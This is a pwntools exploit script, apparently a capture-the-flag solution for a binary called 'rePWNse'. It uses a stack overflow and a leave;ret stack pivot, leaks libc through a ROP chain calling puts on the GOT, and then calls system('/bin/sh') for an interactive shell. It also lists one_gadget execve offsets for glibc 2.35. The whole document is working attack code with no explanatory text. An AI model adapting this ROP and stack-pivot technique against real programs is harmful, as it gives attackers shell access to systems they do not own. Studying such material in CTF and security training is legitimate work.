#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
#libc = ELF('./')
elf = ELF('./rePWNse')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./rePWNse')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

pop_rdi = 0x000000000040168e # pop rdi ; ret
leave_ret = 0x00000000004012bd # leave ; ret

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''

one_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]

io.sendlineafter("t seven single digits:", b"1 " * 6 + b'\n1')

fake_rbp = 0x404e00
fill_buffer = b'a' * 0x40
mig_stack = fill_buffer 
mig_stack += flat(
    fake_rbp, 0x4016A9
)

io.sendafter(b"What do you want?", mig_stack)

fake_rbp2 = fake_rbp - 0x40
fake_rbp3 = fake_rbp
set_gadget_mig_up = flat(
    {
        0:(fake_rbp3,  pop_rdi, puts_got, puts_plt, 0x4016BD),
        0x40:(fake_rbp2,leave_ret,leave_ret)
    },filler=b'\x00'
)
#p()
io.sendafter(b"What do you want?", set_gadget_mig_up)

libc_base = u64(io.recvuntil(b'\n', drop = True) + b'\x00\x00') - libc.sym['puts']
success("libc_base --> " + hex(libc_base))

bin_sh_addr = libc.search(b'/bin/sh').__next__() + libc_base
success("bin sh addr --> " + hex(bin_sh_addr))

#p()
payload = flat(
    {
        0: 0,
        0x20: (pop_rdi, bin_sh_addr, libc.sym['system'] + libc_base)
    }
)
io.send(payload)


io.interactive()

